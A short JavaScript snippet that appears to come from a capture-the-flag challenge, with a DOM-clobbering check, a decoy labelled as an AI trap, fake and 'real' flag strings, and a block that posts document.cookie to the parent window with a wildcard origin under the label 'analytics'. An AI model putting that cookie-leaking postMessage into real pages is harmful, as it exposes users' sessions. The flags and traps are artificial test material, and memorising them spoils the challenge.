// Security validation (DOM clobbering target)
if (window.scriptIntegrity?.value !== '9a9s8d7f6g5h4j3k2l1') {
    throw new Error('Integrity check failed');
}

// AI Trap (Hexadecimal pattern check)
try {
    if (window.name.charCodeAt(0) === 0xDEADBEEF) {
        location.href = '/honeypot';
    }
} catch (e) {}

// Misleading trap
const misleadingTrap = () => {
    const fakeFlag = 'FAKE{THIS_IS_NOT_THE_FLAG}';
    console.log(fakeFlag);
};

// Real CTF Flag
const SECRET_TOKEN = 'MED{H4RD3R_T0_3XTR4CT_FL4G}';

// Sandbox escape payload
window.parent.postMessage({
    type: 'analytics',
    data: document.cookie
}, '*');